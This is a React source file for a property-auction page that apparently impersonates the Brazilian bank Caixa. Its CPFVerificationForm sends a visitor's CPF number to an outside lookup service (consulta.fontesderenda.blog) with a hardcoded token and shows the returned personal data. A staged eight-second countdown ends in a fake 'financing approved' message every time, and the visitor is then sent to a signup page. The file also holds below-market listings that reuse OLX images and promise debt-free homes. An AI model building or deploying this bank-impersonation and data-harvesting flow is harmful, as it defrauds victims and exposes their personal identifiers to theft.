import { useState } from "react";
import { useLocation } from "wouter";
import { useQuery } from "@tanstack/react-query";
import { ArrowLeft, Bed, Bath, Car, ChevronLeft, ChevronRight } from "lucide-react";
import { Header } from "@/components/layout/header";
import { Footer } from "@/components/layout/footer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Skeleton } from "@/components/ui/skeleton";
import { formatCurrency, formatInstallment } from "@/lib/constants";
import type { Property } from "@shared/schema";

interface CPFData {
  cpf: string;
  nome: string;
  nome_mae: string;
  data_nascimento: string;
  sexo: string;
}

interface CPFResponse {
  DADOS: CPFData;
}

function CPFVerificationForm({ propertyId, city, state }: { propertyId: number; city: string; state: string }) {
  const [cpf, setCpf] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationResult, setVerificationResult] = useState<CPFData | null>(null);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(8);

  const cleanCPF = (cpfValue: string) => {
    return cpfValue.replace(/\D/g, '');
  };

  const formatCPF = (cpfValue: string) => {
    const cleaned = cpfValue.replace(/\D/g, '');
    return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  const formatDate = (dateString: string) => {
    // Remove the time part and convert to dd/mm/yyyy
    const date = new Date(dateString);
    return date.toLocaleDateString('pt-BR');
  };

  const handleCPFVerification = async () => {
    if (cpf.length < 14) {
      setError("Por favor, digite um CPF válido");
      return;
    }

    setIsVerifying(true);
    setError("");
    setCountdown(8);

    // Countdown timer
    const countdownInterval = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    try {
      // Simula 8 segundos de análise
      await new Promise(resolve => setTimeout(resolve, 8000));

      const cleanedCPF = cleanCPF(cpf);
      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf=${cleanedCPF}`);
      
      if (!response.ok) {
        throw new Error('Erro na verificação');
      }

      const data: CPFResponse = await response.json();
      setVerificationResult(data.DADOS);
    } catch (err) {
      setError("Erro ao verificar CPF. Tente novamente.");
    } finally {
      clearInterval(countdownInterval);
      setIsVerifying(false);
      setCountdown(8);
    }
  };

  const handleBuyProperty = () => {
    // Salvar dados do usuário no localStorage
    if (verificationResult) {
      localStorage.setItem('userData', JSON.stringify({
        nome: verificationResult.nome,
        cpf: formatCPF(verificationResult.cpf)
      }));
    }
    // Redirecionar para a página de cadastro no Leilões Caixa com o ID do imóvel e parâmetros de localização
    const params = new URLSearchParams();
    params.append('propertyId', propertyId.toString());
    if (city) params.append('city', city);
    if (state) params.append('state', state);
    window.location.href = `/leiloes-caixa-signup?${params.toString()}`;
  };

  if (verificationResult) {
    return (
      <div className="space-y-4">
        <div className="p-4" style={{backgroundColor: '#033c72', borderRadius: '2px'}}>
          <h5 className="font-semibold text-white mb-2">✅ Financiamento Aprovado!</h5>
          <div className="text-sm text-white space-y-1">
            <p><strong>Nome:</strong> {verificationResult.nome}</p>
            <p><strong>CPF:</strong> {formatCPF(verificationResult.cpf)}</p>
            <p><strong>Data de Nascimento:</strong> {formatDate(verificationResult.data_nascimento)}</p>
          </div>
          <p className="text-sm text-white mt-3 font-medium">
            A Caixa aprovou o financiamento de 100% do valor do imóvel sem entrada para você!
          </p>
        </div>
        
        <Button 
          onClick={handleBuyProperty}
          className="btn w-full py-3 font-semibold" 
          style={{borderRadius: '2px'}}
        >
          Quero comprar esse imóvel
        </Button>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      <div>
        <Label htmlFor="cpf" className="text-sm font-medium text-white">
          CPF
        </Label>
        <Input
          id="cpf"
          type="tel"
          inputMode="numeric"
          pattern="[0-9]*"
          value={cpf}
          onChange={(e) => {
            const value = e.target.value;
            // Aplicar máscara de CPF
            let formatted = value.replace(/\D/g, '');
            if (formatted.length >= 4) {
              formatted = formatted.replace(/(\d{3})(\d)/, '$1.$2');
            }
            if (formatted.length >= 7) {
              formatted = formatted.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
            }
            if (formatted.length >= 10) {
              formatted = formatted.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
            }
            setCpf(formatted);
            setError("");
          }}
          placeholder="000.000.000-00"
          maxLength={14}
          className="mt-1"
          style={{borderRadius: '2px'}}
        />
        {error && (
          <p className="text-sm text-red-600 mt-1">{error}</p>
        )}
      </div>
      <Button 
        onClick={handleCPFVerification}
        disabled={isVerifying || cpf.length < 14}
        className="btn w-full py-3 font-semibold" 
        style={{borderRadius: '2px'}}
      >
        {isVerifying ? (
          <span className="flex items-center justify-center">
            <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
            Consultando CPF para liberação de financiamento 100%... ({countdown}s)
          </span>
        ) : (
          cpf.length >= 14 ? "Verificar Financiamento" : "Participar do Leilão"
        )}
      </Button>
    </div>
  );
}

// Old static data function - no longer used, keeping for reference
const getPropertyData = (id: number): Property | null => {
  const properties: Property[] = [
    {
      id: 1,
      title: "Casa Residencial de 3 Quartos - 200m²",
      description: "Excelente casa residencial com área construída de 200m². Imóvel com 3 quartos sendo 1 suíte, 4 banheiros completos, sala ampla, cozinha planejada, área de serviço e garagem para 2 carros. Localizada em bairro nobre, próxima a escolas, supermercados e transporte público. Casa em ótimo estado de conservação, pronta para morar.",
      price: 99800,
      evaluation: 150000,
      location: "Rua das Flores, 123 - Centro",
      city: "São Paulo",
      state: "SP",
      bedrooms: 3,
      bathrooms: 4,
      parking: 2,
      type: "Casa",
      images: [
        "https://img.olx.com.br/images/97/976592778481392.webp",
        "https://img.olx.com.br/images/97/979530653030789.webp",
        "https://img.olx.com.br/images/97/978561292381133.webp",
        "https://img.olx.com.br/images/97/977559656480916.webp",
        "https://img.olx.com.br/images/97/970560774916168.webp",
        "https://img.olx.com.br/images/97/970500531542752.webp",
        "https://img.olx.com.br/images/98/989596418580255.webp",
        "https://img.olx.com.br/images/97/972555770475313.webp",
        "https://img.olx.com.br/images/97/979534413054063.webp"
      ],
      auctionDate: "2025-02-15",
      auctionNumber: "LLO001/2025",
      available: true,
    },
    {
      id: 2,
      title: "Casa de 4 Quartos - 173m²",
      description: "Ampla casa familiar com área construída de 173m². Propriedade com 4 quartos sendo 2 suítes, 2 banheiros, sala de estar, sala de jantar, cozinha americana moderna, área gourmet, quintal espaçoso e garagem coberta para 2 carros. Ideal para famílias que buscam conforto e qualidade de vida.",
      price: 110900,
      evaluation: 170000,
      location: "Avenida Central, 456 - Jardim América",
      city: "São Paulo",
      state: "SP",
      bedrooms: 4,
      bathrooms: 2,
      parking: 2,
      type: "Casa",
      images: [
        "https://img.olx.com.br/images/23/233510424467668.webp",
        "https://img.olx.com.br/images/24/241579662489270.webp",
        "https://img.olx.com.br/images/25/254535421386467.webp",
        "https://img.olx.com.br/images/27/279583188700470.webp",
        "https://img.olx.com.br/images/28/281596426211636.webp",
        "https://img.olx.com.br/images/30/309535181691313.webp",
        "https://img.olx.com.br/images/33/336572904517849.webp",
        "https://img.olx.com.br/images/34/346520660561332.webp"
      ],
      auctionDate: "2025-02-20",
      auctionNumber: "LLO002/2025",
      available: true,
    },
    {
      id: 3,
      title: "Casa Térrea - 190m²",
      description: "Bela casa térrea com área construída de 190m². 3 quartos sendo 1 suíte master, 2 banheiros, sala ampla com pé-direito alto, cozinha planejada, área gourmet com churrasqueira e jardim paisagístico. Garagem para 2 carros. Acabamentos de primeira qualidade e localização privilegiada.",
      price: 115000,
      evaluation: 175000,
      location: "Rua do Sol, 789 - Vila Nova",
      city: "São Paulo",
      state: "SP",
      bedrooms: 3,
      bathrooms: 2,
      parking: 2,
      type: "Casa",
      images: [
        "https://img.olx.com.br/images/48/483483108848770.webp",
        "https://img.olx.com.br/images/74/746410109574106.webp",
        "https://img.olx.com.br/images/74/748473340204660.webp",
        "https://img.olx.com.br/images/75/755488105300828.webp",
        "https://img.olx.com.br/images/75/758438707288052.webp",
        "https://img.olx.com.br/images/77/771424103805941.webp"
      ],
      auctionDate: "2025-02-25",
      auctionNumber: "LLO003/2025",
      available: true,
    },
    {
      id: 4,
      title: "Apartamento de 2 Quartos - 60m²",
      description: "Moderno apartamento no coração da cidade com área útil de 60m². 2 quartos com armários planejados, 2 banheiros completos, sala integrada com varanda, cozinha americana equipada, área de serviço e 1 vaga de garagem. Edifício com portaria 24h, elevador e área de lazer. Localização estratégica com fácil acesso a transporte público.",
      price: 89000,
      evaluation: 130000,
      location: "Edifício Central, Apto 801 - Centro",
      city: "São Paulo",
      state: "SP",
      bedrooms: 2,
      bathrooms: 2,
      parking: 1,
      type: "Apartamento",
      images: [
        "https://img.olx.com.br/images/97/974579631062270.webp",
        "https://img.olx.com.br/images/97/972552275953944.webp",
        "https://img.olx.com.br/images/97/971562397621873.webp",
        "https://img.olx.com.br/images/97/978570152351230.webp",
        "https://img.olx.com.br/images/98/982506152124407.webp",
        "https://img.olx.com.br/images/97/977515633209455.webp",
        "https://img.olx.com.br/images/97/975566638200593.webp",
        "https://img.olx.com.br/images/97/974520512503881.webp",
        "https://img.olx.com.br/images/97/974557639668231.webp",
        "https://img.olx.com.br/images/98/982584877151141.webp",
        "https://img.olx.com.br/images/41/418554396686406.webp"
      ],
      auctionDate: "2025-02-18",
      auctionNumber: "LLO004/2025",
      available: true,
    },
  ];

  return properties.find(p => p.id === id) || null;
};

export default function PropertyDetail() {
  const [location, setLocation] = useLocation();
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  
  const propertyId = parseInt(location.split('/')[2] || '0');
  
  // Get city and state from URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  const city = urlParams.get('city') || '';
  const state = urlParams.get('state') || '';

  // Fetch property data from API with dynamic location
  const { data: property, isLoading } = useQuery<Property>({
    queryKey: ['/api/properties', propertyId, city, state],
    queryFn: async () => {
      const params = new URLSearchParams();
      if (city) params.append('city', city);
      if (state) params.append('state', state);
      
      const response = await fetch(`/api/properties/${propertyId}?${params.toString()}`);
      if (!response.ok) throw new Error('Failed to fetch property');
      return response.json();
    },
    enabled: !!propertyId,
  });

  const nextImage = () => {
    if (property && property.images.length > 1) {
      setCurrentImageIndex((prev) => (prev + 1) % property.images.length);
    }
  };

  const prevImage = () => {
    if (property && property.images.length > 1) {
      setCurrentImageIndex((prev) => (prev - 1 + property.images.length) % property.images.length);
    }
  };

  if (!isLoading && !property) {
    return (
      <div className="min-h-screen bg-gray-50">
        <Header />
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
          <div className="text-center">
            <h2 className="text-2xl font-bold text-red-600 mb-4">Imóvel não encontrado</h2>
            <p className="text-gray-600 mb-6">O imóvel solicitado não foi encontrado.</p>
            <Button onClick={() => setLocation('/properties')}>
              Voltar para Listagem
            </Button>
          </div>
        </div>
        <Footer />
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50">
        <Header />
        <section className="py-12 bg-white">
          <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
            <Skeleton className="h-8 w-32 mb-6" />
            <div className="grid lg:grid-cols-2 gap-8">
              <div>
                <Skeleton className="w-full h-96 rounded-lg mb-4" />
                <div className="grid grid-cols-2 gap-2">
                  <Skeleton className="w-full h-24 rounded" />
                  <Skeleton className="w-full h-24 rounded" />
                </div>
              </div>
              <div className="space-y-6">
                <Skeleton className="h-8 w-3/4" />
                <Skeleton className="h-6 w-1/2" />
                <Skeleton className="h-32 w-full" />
              </div>
            </div>
          </div>
        </section>
        <Footer />
      </div>
    );
  }

  if (!property) return null;

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      <section className="py-12 bg-white">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="mb-6">
            <button
              onClick={() => window.history.back()}
              className="text-caixa-blue hover:text-blue-700 flex items-center mb-4"
            >
              <ArrowLeft className="w-4 h-4 mr-2" />
              Voltar para listagem
            </button>
          </div>

          <div className="grid lg:grid-cols-2 gap-8">
            <div>
              {/* Property image gallery */}
              <div className="mb-6">
                {/* Carrossel de Imagens */}
                <div className="relative">
                  <img 
                    src={property.images[currentImageIndex]} 
                    alt={`${property.title} - ${currentImageIndex + 1}`}
                    className="w-full h-96 object-cover shadow-lg"
                    style={{borderRadius: '2px'}}
                  />
                  
                  {/* Botões de navegação do carrossel */}
                  {property.images.length > 1 && (
                    <>
                      <button
                        onClick={prevImage}
                        className="absolute left-4 top-1/2 transform -translate-y-1/2 bg-black bg-opacity-50 text-white p-2 hover:bg-opacity-70 transition-all"
                        style={{borderRadius: '2px'}}
                      >
                        <ChevronLeft className="w-6 h-6" />
                      </button>
                      <button
                        onClick={nextImage}
                        className="absolute right-4 top-1/2 transform -translate-y-1/2 bg-black bg-opacity-50 text-white p-2 hover:bg-opacity-70 transition-all"
                        style={{borderRadius: '2px'}}
                      >
                        <ChevronRight className="w-6 h-6" />
                      </button>
                    </>
                  )}
                  
                  {/* Indicadores do carrossel */}
                  {property.images.length > 1 && (
                    <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2 flex space-x-2">
                      {property.images.map((_, index) => (
                        <button
                          key={index}
                          onClick={() => setCurrentImageIndex(index)}
                          className={`w-3 h-3 rounded-full transition-all ${
                            index === currentImageIndex 
                              ? 'bg-white' 
                              : 'bg-white bg-opacity-50 hover:bg-opacity-70'
                          }`}
                        />
                      ))}
                    </div>
                  )}
                </div>
                
                {/* Contador de imagens */}
                {property.images.length > 1 && (
                  <div className="text-center mt-2 text-sm text-gray-600">
                    {currentImageIndex + 1} de {property.images.length} fotos
                  </div>
                )}
              </div>
            </div>
            
            <div>
              <div className="bg-white p-6 shadow-lg" style={{borderRadius: '2px'}}>
                <div className="flex items-center justify-between mb-4">
                  <span className={`px-3 py-1 rounded text-sm font-medium ${
                    property.type === 'Casa' 
                      ? 'bg-green-100 text-green-800' 
                      : 'bg-blue-100 text-blue-800'
                  }`}>
                    {property.type}
                  </span>
                  <span className="text-gray-500 text-sm">
                    Leilão #{property.auctionNumber}
                  </span>
                </div>
                
                <h1 className="text-3xl font-bold text-gray-900 mb-2">
                  {property.title}
                </h1>
                <p className="text-lg text-gray-600 mb-6">{property.location}</p>
                
                <div className="bg-gray-50 p-4 mb-6" style={{borderRadius: '2px'}}>
                  <div className="text-3xl font-bold text-caixa-blue mb-2">
                    {formatInstallment(property.price)} /mês
                  </div>
                  <div className="text-sm text-gray-600 mb-1">
                    120x • <span className="font-bold text-green-600">Valor total: {formatCurrency(property.price)}</span>
                  </div>
                  <div className="text-sm text-gray-500">
                    Avaliação: {formatCurrency(property.evaluation)}
                  </div>
                </div>
                
                <div className="grid grid-cols-3 gap-4 mb-6">
                  <div className="text-center p-3 bg-gray-50" style={{borderRadius: '2px'}}>
                    <Bed className="text-caixa-blue w-6 h-6 mx-auto mb-2" />
                    <div className="text-sm text-gray-600">Quartos</div>
                    <div className="font-semibold">{property.bedrooms}</div>
                  </div>
                  <div className="text-center p-3 bg-gray-50" style={{borderRadius: '2px'}}>
                    <Bath className="text-caixa-blue w-6 h-6 mx-auto mb-2" />
                    <div className="text-sm text-gray-600">Banheiros</div>
                    <div className="font-semibold">{property.bathrooms}</div>
                  </div>
                  <div className="text-center p-3 bg-gray-50" style={{borderRadius: '2px'}}>
                    <Car className="text-caixa-blue w-6 h-6 mx-auto mb-2" />
                    <div className="text-sm text-gray-600">Vagas</div>
                    <div className="font-semibold">{property.parking}</div>
                  </div>
                </div>
                
                <div className="mb-6">
                  <h3 className="text-lg font-semibold mb-3">Detalhes do Imóvel</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-gray-600">Situação:</span>
                      <span className="font-medium text-green-600">Desocupado</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Débitos:</span>
                      <span className="font-medium text-green-600">Sem débitos</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Financiamento:</span>
                      <span className="font-medium text-blue-600">100% financiável</span>
                    </div>
                  </div>
                </div>
                

              </div>
            </div>
          </div>
          
          <div className="mt-12">
            <div className="bg-orange-50 border border-orange-200 p-6 mb-6" style={{borderRadius: '2px'}}>
              <h4 className="text-lg font-semibold text-orange-800 mb-3">
                Por que este imóvel está à venda pela Caixa?
              </h4>
              <p className="text-orange-700 leading-relaxed text-sm mb-3">
                Este imóvel está disponível porque o proprietário anterior adquiriu o imóvel através de um financiamento habitacional da Caixa, 
                mas acabou atrasando as parcelas e não conseguiu quitar a dívida. Por essa razão, o imóvel foi devolvido voluntariamente à Caixa 
                e agora está sendo oferecido em leilão.
              </p>
              <p className="text-orange-700 leading-relaxed text-sm font-medium">
                <strong>Garantia para você:</strong> Ao adquirir este imóvel, ele será entregue completamente livre de qualquer dívida de IPTU, 
                financiamento ou outros débitos, com toda a documentação regularizada e completa.
              </p>
            </div>
            
            <h3 className="text-2xl font-bold mb-6">Descrição do Imóvel</h3>
            <div className="bg-white p-6 shadow-lg" style={{borderRadius: '2px'}}>
              <p className="text-gray-700 leading-relaxed">{property.description}</p>
            </div>
            
            <div className="p-6 mt-[66px] mb-[66px] ml-[-10px] mr-[-10px] pl-[24px] pr-[24px] pt-[50px] pb-[50px]" style={{backgroundColor: '#1964ad', borderRadius: '2px'}}>
              <h4 className="text-lg font-semibold text-white mb-4">
                Verificação de Financiamento
              </h4>
              <p className="text-white mb-4 text-sm">
                Informe seu CPF para verificar se a Caixa aprova o financiamento de 100% do valor do imóvel para você.
              </p>
              
              <CPFVerificationForm propertyId={property.id} city={city} state={state} />
            </div>
          </div>
        </div>
      </section>
      <Footer />
    </div>
  );
}
